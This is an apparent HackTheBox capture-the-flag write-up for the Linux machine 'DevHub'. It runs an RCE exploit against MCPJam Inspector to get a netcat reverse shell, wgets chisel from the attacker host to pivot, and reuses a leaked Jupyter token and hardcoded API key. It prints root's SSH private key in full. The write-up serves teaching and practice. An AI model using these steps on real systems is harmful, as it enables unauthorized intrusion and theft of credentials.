---
title: HTB · DevHub
slug: htb-devhub
date: 2026-08-21
image: devhub
platform: HackTheBox
os: Linux
difficulty: Medium
points: 845
tags: [hackthebox, linux, medium, active, mcpjam, cve-2026-23744, ps, jupyter, api, chisel, pivoting]
description: DevHub is a Medium-difficulty Linux machine centered on Model Context Protocol (MCP) tooling. It starts with an unauthenticated RCE in an exposed MCPJam Inspector instance, then chains a leaked Jupyter Lab token (exposed via /proc) and a hardcoded admin API key to dump root's SSH private key.
featured: true
---

# Reconnaissance
## Staged Nmap Scanning
```bash
nmap -p- --min-rate 10000 10.129.245.216
nmap -p 22,80,6274 -sCV 10.129.245.216
```
### Initial Scan Results
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Fri, 21 Aug 2026 18:13:17 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Fri, 21 Aug 2026 18:13:18 GMT
|_    Connection: close
```
Port 6274 runs MCPJam Inspector, a development tool used to test and debug Model Context Protocol (MCP) server configurations - and it was reachable without authentication.
## Hosts File
The website uses a virtual host. I'll add it to `/etc/hosts`:
```bash
echo "10.129.245.216 devhub.htb" | sudo tee -a /etc/hosts
```
---
# Exploitation
Let's go to the 6274 port on the website like so: `http://devhub.htb:6274/`. And after looking around and clicking buttons i could find the version of MCPJam, which is: v1.4.2. And with this information i found a public RCE for that version on GitHub called [CVE-2026-23744](https://github.com/alisster00/CVE-2026-23744-RCE).
Let's run a listener on our machine:
```bash
nc -lnvp 4444 
```
And run the exploit:
```bash
python script.py --lport 4444 --lhost 10.10.14.12 -p 6274 devhub.htb
```
And we got a shell as `mcp-dev@devhub`.
### Horizontal Privilege Escalation
After enumerating local processes with `ps aux`, i could see that there is jupyter running on the machine. 
```bash
ps aux | grep jupyter
```
And then this command revealed a Jupyter Lab instance running as the `analyst` user, with its access token passed directly on the command line (and therefore visible to any local user via `/proc`):
```js
analyst     1088  0.4  2.4 182536 96196 ?        Ss   18:06   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```
- **Extracted token:** `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`
- **Binding:** `127.0.0.1:8888` (loopback only)
### Pivoting with Chisel
Since Jupyter was bound to loopback only, `chisel` was uploaded to `/tmp` on the target to tunnel port 8888 back to the attacking host.
First let's install chisel to transfer it to the machine:
```js
gitclone https://github.com/jpillora/chisel.git
gunzip chisel_1.12.0-rc3_linux_amd64.gz
python3 -m http.server 80
```
And on the DevHub machine:
```js
wget 10.10.14.12:80/chisel_1.12.0-rc3_linux_amd64
chmod 777 chisel_1.12.0-rc3_linux_amd64
/tmp/chisel_1.12.0-rc3_linux_amd64 client 10.10.14.12:9002 R:8888:127.0.0.1:8888
```
With the tunnel up, browsing to `http://127.0.0.1:8888` on the attacking machine and supplying the leaked token dropped into the Jupyter Lab dashboard running as `analyst`.
And then open a new terminal session and grab the user.txt flag.
# Vertical Privilege Escalation
Using the Jupyter Lab file browser and terminal, an internal Flask admin script was found at `/opt/opsmcp/server.py`:
```bash
cat /opt/opsmcp/server.py
```
The script exposed an admin API on local port 5000, protected only by a **hardcoded API key**:
- **API key:** `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
- **Hidden admin function:** `ops._admin_dump`, which accepts a `target` of `ssh_keys`, `passwords`, or `tokens`

Calling this endpoint from the Jupyter terminal against `ops._admin_dump` with `target: ssh_keys` returned a JSON blob containing the root user's private SSH key (with `\n` sequences escaped inside the JSON string).
I reconstructed the key like this:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
```
And then connected with this key via ssh.
```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.129.245.216
```
